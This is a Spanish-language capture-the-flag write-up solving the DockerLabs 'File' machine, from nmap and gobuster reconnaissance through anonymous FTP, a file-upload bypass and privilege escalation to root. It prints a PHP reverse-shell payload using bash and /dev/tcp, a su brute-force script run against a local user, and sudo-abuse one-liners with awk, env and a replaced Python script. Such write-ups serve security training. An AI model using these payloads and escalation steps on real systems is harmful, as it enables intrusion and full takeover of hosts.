#MAQUINA #DOCKERLABS #FACIL 
#FTP_ANON #ABUSO_SUBIDA_ARCHIVOS #SU_BRUTE_FORCE
<hr>

# RECONOCIMIENTO

Vamos a resolver **File** de la plataforma **DockerLabs**.

   ```bash

Máquina desplegada, su dirección IP es --> 172.17.0.2

```

Primero vamos a hacer un escaneo de puertos rápido:

```bash

nmap -sS --min-rate 5000 -vvv -n -Pn -p- 172.17.0.2 --open
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-11 17:20 CET
Initiating ARP Ping Scan at 17:20
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 17:20, 0.06s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 17:20
Scanning 172.17.0.2 [65535 ports]
Discovered open port 21/tcp on 172.17.0.2
Discovered open port 80/tcp on 172.17.0.2
Completed SYN Stealth Scan at 17:20, 0.50s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.0000030s latency).
Scanned at 2024-12-11 17:20:52 CET for 1s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.71 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)


```

- **`--open`**: Muestra solo los puertos abiertos en la salida.
- **`-sS`**: Especifica un escaneo TCP SYN, que es más sigiloso que un escaneo de conexión completa.
- **`--min-rate 5000`**: Establece la tasa mínima de paquetes enviados a 5000 por segundo, haciendo que el escaneo sea más rápido.
- **`-vvv`**: Aumenta el nivel de verbosidad, proporcionando una salida más detallada durante el escaneo.
- **`-n`**: No resuelve DNS; esto evita retrasos por búsquedas de nombres.
- **`-Pn`**: Trata el objetivo como si estuviera en línea; omite el descubrimiento de hosts.
- **`-p-`**: Escanea todos los 65535 puertos en lugar de solo los más comunes.

**Conclusiones:** El ttl al ser 64 nos dice que es una máquina **Linux**. Además, vemos que tiene el puerto **80(HTTP)** y el puerto **21(FTP)** abiertos.

Ahora vamos a hacer un escaneo con mayor detalle:

   ```bash

nmap -sCV -p21,80 172.17.0.2                             
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-11 17:21 CET
Nmap scan report for pressenter.hl (172.17.0.2)
Host is up (0.000019s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-r--r--r--    1 65534    65534          33 Sep 12 21:50 anon.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:172.17.0.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.78 seconds



```

   ```bash

nmap --script="http-enum" 172.17.0.2
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-11 17:21 CET
Nmap scan report for pressenter.hl (172.17.0.2)
Host is up (0.0000030s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
80/tcp open  http
| http-enum: 
|_  /uploads/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
MAC Address: 02:42:AC:11:00:02 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.45 seconds


```

- **`-sC`**: Realiza un escaneo de scripts (Nmap Scripting Engine, NSE). Esto permite ejecutar scripts de `nmap` para obtener información adicional sobre los servicios detectados, como vulnerabilidades, configuraciones o detalles específicos de los mismos.
- **`-sV`**: Realiza la detección de versiones de servicios. Esto intenta identificar la versión exacta del software que está escuchando en un puerto abierto, lo que puede ayudar a determinar si hay vulnerabilidades conocidas.
- **`--script`**:  Ejecutar un script específico.

**Conclusiones:** FTP vulnerable a **ftp-anon** y directorio **uploads** interesante .

## FTP(21)

Al revisar vemos un txt con:

**53dd9c6005f3cdfc5a69c5c07388016d** -> **justin** (MD5)

## HTTP (80)
Al revisar la web que hay en el puerto 80, usamos **gobuster** :

   ```bash

gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x html,php,js,txt,png,jpg
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              png,jpg,html,php,js,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 11008]
/.php                 (Status: 403) [Size: 275]
/uploads              (Status: 301) [Size: 310] [--> http://172.17.0.2/uploads/]
/.html                (Status: 403) [Size: 275]
/.php                 (Status: 403) [Size: 275]
/.html                (Status: 403) [Size: 275]
/server-status        (Status: 403) [Size: 275]
/file_upload.php      (Status: 200) [Size: 468]
Progress: 1543913 / 1543920 (100.00%)
===============================================================
Finished
===============================================================

```

Tenemos un directorio listable **/uploads** y un **/file_upload.php**.

# EXPLOTACION

Vamos a subir un php que nos otorgue una reverse shell. Para ello al subir el archivo interceptamos la petición y cambiamos la extensión a **.phar** y nos ponemos en escucha por el puerto 443 (**nc -nlvp 443**) :

   ```bash

POST /subir_archivo.php HTTP/1.1
Host: 172.17.0.2
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------413812673414064069493916390486
Content-Length: 604
Origin: http://172.17.0.2
Connection: keep-alive
Referer: http://172.17.0.2/file_upload.php
Upgrade-Insecure-Requests: 1
Priority: u=0, i

-----------------------------413812673414064069493916390486
Content-Disposition: form-data; name="archivo"; filename="wp.phar"
Content-Type: application/x-php

<?php

/**
* Plugin Name: test-plugin
* Plugin URI: https://www.your-site.com/
* Description: Test.
* Version: 0.1
* Author: your-name
* Author URI: https://www.your-site.com/
**/


	exec("/bin/bash -c 'bash -i > /dev/tcp/172.17.0.1/443 0>&1'");

?>

-----------------------------413812673414064069493916390486
Content-Disposition: form-data; name="submit"

Subir archivo
-----------------------------413812673414064069493916390486--

```

# ESCALADA PRIVILEGIOS
Tras un buen rato, no encontramos forma de escalar, vamos a probar a hacer un ataque de fuerza bruta.

Nos descargamos : https://github.com/Maalfer/Sudo_BruteForce/blob/main/Linux-Su-Force.py

   ```bash
www-data@e5d8d275281e:/tmp$ ./Linux-Su-Force.sh mario rockyou.txt 
Contraseña encontrada para el usuario mario: password123
```

**Usuario -> mario**
**Contra -> password123**

Vemos si el usuario tiene permisos SUDO:
   ```bash
mario@e5d8d275281e:/tmp$ sudo -l
Matching Defaults entries for mario on e5d8d275281e:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mario may run the following commands on e5d8d275281e:
    (julen) NOPASSWD: /usr/bin/awk


```

Vemos **awk** con permisos SUDO :
   ```bash
mario@e5d8d275281e:/tmp$ sudo -u julen awk 'BEGIN {system("/bin/sh")}'
$ whoami
julen

```

YA ESTAMOS COMO JULEN.

Vemos si el usuario tiene permisos SUDO:
   ```bash
$ sudo -l
Matching Defaults entries for julen on e5d8d275281e:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User julen may run the following commands on e5d8d275281e:
    (iker) NOPASSWD: /usr/bin/env



```

Vemos **env** con permisos SUDO :
   ```bash
$ sudo -u iker env /bin/sh
$ whoami
iker
```

YA ESTAMOS COMO IKER.

Vemos si el usuario tiene permisos SUDO:
   ```bash
$ sudo -l
Matching Defaults entries for iker on e5d8d275281e:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User iker may run the following commands on e5d8d275281e:
    (ALL) NOPASSWD: /usr/bin/python3 /home/iker/geo_ip.py

```

Vemos **geo_ip.py** con permisos SUDO al ejecutarlo con python3. Como el directorio es nuestro, lo eliminamos y creamos uno que nos de una shell:

   ```bash

iker@e5d8d275281e:~$ cat geo_ip.py 
import  os
os.system("/bin/sh")
iker@e5d8d275281e:~$ sudo /usr/bin/python3 /home/iker/geo_ip.py 
# whoami
root

```

**YA ESTAMOS COMO ROOT.**